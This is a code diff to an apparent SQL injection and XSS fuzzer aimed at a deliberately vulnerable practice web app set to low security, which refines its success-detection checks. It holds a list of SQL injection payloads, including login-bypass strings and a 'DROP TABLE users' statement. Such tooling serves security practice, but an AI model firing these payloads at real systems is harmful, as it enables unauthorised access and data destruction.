@@ -15,7 +15,7 @@ CREDENTIALS = {
     "Login": "Login"
 }
 
-# Sample payloads - we'll expand these later
+# Sample payloads
 SQLI_PAYLOADS = [
     "1", "1'", "1' OR '1'='1", "1' OR 1=1--",
     "' OR 1=1--", "admin'--", "1; DROP TABLE users--",
@@ -64,17 +64,23 @@ def get_session():
         print("[+] Set security level to low")
     return session
 
+
 def detect_sqli(response_text):
     """Check if response indicates SQL injection success."""
     indicators = [
         "first name:", "surname:" 
     ]
     response_lower = response_text.lower()
-    return any(indicator in response_lower for indicator in indicators)
+    if response_lower.count("first name:") < 2:
+        return False
+    else:
+        return any(indicator in response_lower for indicator in indicators)
 
 def detect_xss(response_text, payload):
     """Check if payload is reflected in response."""
-    return payload in response_text
+    if payload in response_text and ("<" in payload):
+        return True
+    return False
 
 def fuzz_sqli(session, payloads, label_override=None):
     """Fuzz the SQLi endpoint and return results."""
